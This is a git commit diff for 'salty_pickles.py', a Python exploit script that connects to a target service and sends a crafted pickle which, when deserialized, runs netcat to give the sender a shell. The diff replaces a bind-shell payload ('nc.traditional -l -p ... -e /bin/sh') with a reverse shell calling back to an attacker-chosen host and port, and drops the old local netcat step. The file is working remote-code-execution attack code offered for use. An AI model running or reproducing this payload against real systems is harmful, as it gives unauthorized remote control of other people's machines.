72efa4f975fd1c3e16154dd13a742bd2179630c3
Mr Pacman <mrpcmn@protonmail.com>
2018-11-18 17:18:17 +0000

    Update salty_pickles.py

--- salty_pickles.py
+++ salty_pickles.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 from __future__ import print_function
 import os
 import socket
@@ -6,17 +6,12 @@ import sys
 import time
 
 
-def payload(shell_port):
-    pickled_shell = "cos\nsystem\n(S'nc.traditional -l -p {0:d} -e /bin/sh'".format(shell_port)
-    return bytes(pickled_shell)
+def payload(rev_host, rev_port):
+    pickled_shell = "cos\nsystem\n(S'nc.traditional -e /bin/sh {0} {1}'\ntR.".format(rev_host, rev_port)
+    return pickled_shell.encode()
 
 
-def launch_netcat(rhost, shell_port):
-    """ Apparently, netcat has it's own way of answering to network data. """
-    os.system("nc {0:s} {1:d}".format(rhost, shell_port))
-
-
-def conx(rhost, rport, shell_port):
+def conx(rhost, rport, l_ip, l_port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
     err = 0
     
@@ -25,14 +20,12 @@ def conx(rhost, rport, shell_port):
         sock.connect((rhost, rport))
         
         print("Sending pickle...")
-        sock.send(payload(shell_port))
+        print(payload(l_ip, l_port))
+        sock.sendall(payload(l_ip, l_port))
         
         # Let's wait for the sent data.
         time.sleep(1)
         
-        print("Launching netcat on port {0:d}".format(shell_port))
-        launch_netcat(rhost, shell_port)
-    
     except socket.error as sock_err:
         print("Error: {0:s}".format(sock.strerror), file=sys.stderr)
         err = sock_err.errno
@@ -41,16 +34,13 @@ def conx(rhost, rport, shell_port):
         print("Error: {0:s}".format(g_error.strerror), file=sys.stderr)
         err = g_error.errno
      
-    except Exeption as gen_err:
-        print(gen_err, file=sys.stderr)
-    
     finally:
         sock.close()
         sys.exit(err)
 
 if __name__ == "__main__":
-    if len(sys.argv) != 4:
-        print("Usage: {0} <ip> <port> <nc shell port>".format(sys.argv[0]))
+    if len(sys.argv) != 5:
+        print("Usage: {0} <r_ip> <r_port> <l_host> <l_port>".format(sys.argv[0]))
         sys.exit(0)
     
-    conx(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+    conx(sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]))
